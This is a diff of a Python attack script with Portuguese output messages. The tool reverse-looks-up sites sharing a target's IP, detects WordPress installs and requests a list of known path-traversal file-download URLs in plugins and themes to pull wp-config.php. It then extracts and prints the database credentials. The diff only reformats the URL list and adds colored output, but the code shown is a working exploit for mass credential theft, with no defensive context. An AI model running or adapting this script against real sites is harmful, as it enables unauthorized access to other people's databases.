@@ -11,14 +11,15 @@ import requests
 
 
 reversing = []
-vullns = ['/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
-          '/wp-content/force-download.php?file=../wp-config.php',
-          '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php',
-          '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php',
-          '/wp-content/themes/markant/download.php?file=../../wp-config.php',
-          '/wp-content/themes/yakimabait/download.php?file=./wp-config.php',
-          '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
-          ]
+vullns = [
+    '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
+    '/wp-content/force-download.php?file=../wp-config.php',
+    '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php',
+    '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php',
+    '/wp-content/themes/markant/download.php?file=../../wp-config.php',
+    '/wp-content/themes/yakimabait/download.php?file=./wp-config.php',
+    '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
+]
 
 
 def Main():
@@ -26,6 +27,12 @@ def Main():
     Argumentos()
     ReverseIP(target)
     Verific()
+
+
+class Colors:
+    red = "\033[91m"
+    green = "\033[32m"
+    default = "\033[0m"
 
 
 def Sistema():
@@ -77,7 +84,7 @@ def Attack(site):
                     'DB_HOST:': re.findall("'DB_HOST', '(.*?)'", req)
                 }
                 for i in data:
-                    print(i, data[i][0])
+                    print(Colors.green + i, data[i][0] + Colors.default)
 
         except:
             pass
@@ -89,10 +96,12 @@ def Verific():
         try:
             req = requests.get("http://www." + i[0]).text
             if "/wp-content/" in req or "/wp-includes/" in req:
-                print("http://" + i[0] + " WordPress detectado.")
+                print(Colors.default + "http://" + i[0] + Colors.red + " CMS: WordPress")
                 Attack("http://" + i[0])
             else:
                 print("http://" + i[0] + " CMS não detectado.")
         except:
             print("Não foi possivel acessar: http://www." + i[0])
+
+
 Main()
